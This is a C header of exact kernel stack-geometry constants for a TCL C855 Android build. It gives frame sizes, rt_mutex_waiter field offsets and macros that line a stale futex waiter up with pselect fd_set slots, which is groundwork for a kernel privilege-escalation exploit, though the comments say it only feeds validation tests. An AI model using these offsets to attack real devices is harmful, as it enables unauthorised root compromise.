#ifndef TCL_V643_STACK_GEOMETRY_H
#define TCL_V643_STACK_GEOMETRY_H

/*
 * Exact offline stack geometry for TCL C855 V643, kernel
 * 5.15.180-android14-11.  These constants are consumed only by host-side
 * validation tests; they do not select or arm an exploit route.
 *
 * Sources:
 *   __arm64_sys_futex/do_futex       -> rt_waiter at syscall SP - 0x1d0
 *   __arm64_sys_pselect6             -> 0x90-byte frame
 *   core_sys_select                  -> 0x1c0-byte frame
 *   core_sys_select stack_fds        -> frame SP + 0x50
 *
 * Consequently stack_fds starts at syscall SP - 0x200 and the stale
 * rt_mutex_waiter starts 0x30 bytes into stack_fds.
 *
 * The exact V643 entry path also has a compiled random-kstack alternative.
 * The stock V643 configuration leaves its static key disabled and neither
 * the live command line nor the extracted vendor bootconfig enables it.
 * Keep the entry-frame and dormant-offset constants here so host tests catch
 * any future assumption that the +0x30 alias is unconditional on every build.
 */
#define TCL_V643_EL0_SVC_FRAME_SIZE           0x020U
#define TCL_V643_DO_EL0_SVC_FRAME_SIZE        0x010U
#define TCL_V643_EL0_SVC_COMMON_FRAME_SIZE    0x030U
#define TCL_V643_INVOKE_SYSCALL_FRAME_SIZE    0x030U
#define TCL_V643_SYSCALL_FROM_EL0_SP           0x090U

/* invoke_syscall's dormant alternative rounds the masked low ten bits up to
 * 16-byte alignment.  The resulting displacement is 0..0x400, not 0..0x7f0.
 * It is inactive on the exact stock V643 boot documented in the audit. */
#define TCL_V643_RANDOM_KSTACK_ALIGN           0x010U
#define TCL_V643_RANDOM_KSTACK_MAX             0x400U
#define TCL_V643_RANDOM_KSTACK_DEFAULT_ENABLED 0U

/* Signal delivery happens after the syscall frames have unwound back to the
 * el0_svc frame.  These are stack-depth landmarks, not a claim that the stale
 * waiter contents survive: the pselect carrier deliberately replaces them. */
#define TCL_V643_NOTIFY_FROM_EL0_SP            0x0e0U
#define TCL_V643_GET_SIGNAL_FROM_EL0_SP        0x170U
#define TCL_V643_HANDLE_SIGNAL_FROM_EL0_SP     0x1c0U

#define TCL_V643_WAITER_FROM_SYSCALL_SP       0x1d0U
#define TCL_V643_PSELECT_FRAME_SIZE           0x090U
#define TCL_V643_CORE_SELECT_FRAME_SIZE       0x1c0U
#define TCL_V643_CORE_SELECT_STACK_FDS_OFF    0x050U
#define TCL_V643_STACK_FDS_FROM_SYSCALL_SP    0x200U
#define TCL_V643_STACK_FDS_TO_WAITER          0x030U

/* nfds=320 rounds to 40 bytes per fd_set and remains in stack_fds: the
 * exact binary switches to kvmalloc when bytes_per_set >= 0x2b. */
#define TCL_V643_PSELECT_NFDS                 320U
#define TCL_V643_FDSET_BYTES                  0x028U
#define TCL_V643_FDSET_COUNT                  6U
#define TCL_V643_STACK_FDS_BYTES              0x0f0U

enum tcl_v643_fdset_slot {
  TCL_V643_IN_READ = 0,
  TCL_V643_IN_WRITE,
  TCL_V643_IN_EXCEPT,
  TCL_V643_OUT_READ,
  TCL_V643_OUT_WRITE,
  TCL_V643_OUT_EXCEPT,
};

/* Exact BTF offsets for struct rt_mutex_waiter (size 0x58). */
#define TCL_V643_WAITER_SIZE                  0x058U
#define TCL_V643_WAITER_TREE                  0x000U
#define TCL_V643_WAITER_PI_TREE               0x018U
#define TCL_V643_WAITER_TASK                  0x030U
#define TCL_V643_WAITER_LOCK                  0x038U
#define TCL_V643_WAITER_WAKE_STATE            0x040U
#define TCL_V643_WAITER_PRIO                  0x044U
#define TCL_V643_WAITER_DEADLINE              0x048U
#define TCL_V643_WAITER_WW_CTX                0x050U

#define TCL_V643_FDS_OFF(waiter_off) \
  (TCL_V643_STACK_FDS_TO_WAITER + (waiter_off))
#define TCL_V643_FDSET_SLOT(waiter_off) \
  (TCL_V643_FDS_OFF(waiter_off) / TCL_V643_FDSET_BYTES)
#define TCL_V643_FDSET_SLOT_OFF(waiter_off) \
  (TCL_V643_FDS_OFF(waiter_off) % TCL_V643_FDSET_BYTES)

#endif
